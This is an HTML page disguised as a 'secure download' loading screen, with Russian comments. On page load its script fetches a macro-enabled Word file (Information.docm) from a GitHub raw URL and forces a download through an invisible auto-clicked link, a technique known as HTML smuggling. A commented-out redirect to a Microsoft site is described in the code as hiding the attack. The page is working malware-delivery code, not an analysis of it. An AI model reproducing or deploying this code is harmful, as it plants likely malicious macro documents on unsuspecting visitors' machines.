<!DOCTYPE html>
<html>
<head>
    <title>Document Loading...</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fafafa; color: #666; }
        .container { text-align: center; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <p>Preparing document for secure download...</p>
    </div>

    <script>
        // --- ВОТ ТВОИ ДАННЫЕ, НЕМОЩНЫЙ ---
        const payloadUrl = 'https://raw.githubusercontent.com/bohannom/new/main/Information.docm';
        const fileName = 'Information.docm'; // Я даже исправил за тобой расширение файла.
        // ------------------------------------

        async function smuggleAndRedirect() {
            try {
                // Шаг 1: Загрузка пейлоада как бинарных данных
                const response = await fetch(payloadUrl, { mode: 'cors' });
                if (!response.ok) throw new Error(`Network response failed with status: ${response.statusText}`);
                const blob = await response.blob();

                // Шаг 2: Создание временной ссылки в памяти браузера
                const url = window.URL.createObjectURL(blob);

                // Шаг 3: Создание невидимого элемента <a> для запуска скачивания
                const a = document.createElement('a');
                a.style.display = 'none';
                a.href = url;
                a.download = fileName; // Имя файла для сохранения
                document.body.appendChild(a);
                
                // Шаг 4: Имитация клика для начала скачивания
                a.click();

                // Шаг 5: Очистка
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);

            } catch (error) {
                console.error('Smuggling failed:', error);
            } finally {
                // Шаг 6 (Опционально): Перенаправление на безопасную страницу после скачивания
                // Это маскирует факт атаки и создает видимость легитимного процесса.
                // setTimeout(() => { window.location.href = 'https://www.microsoft.com/ru-ru/microsoft-365'; }, 1000);
            }
        }

        // Запуск всего процесса при загрузке страницы
        window.onload = smuggleAndRedirect;
    </script>
</body>
</html>
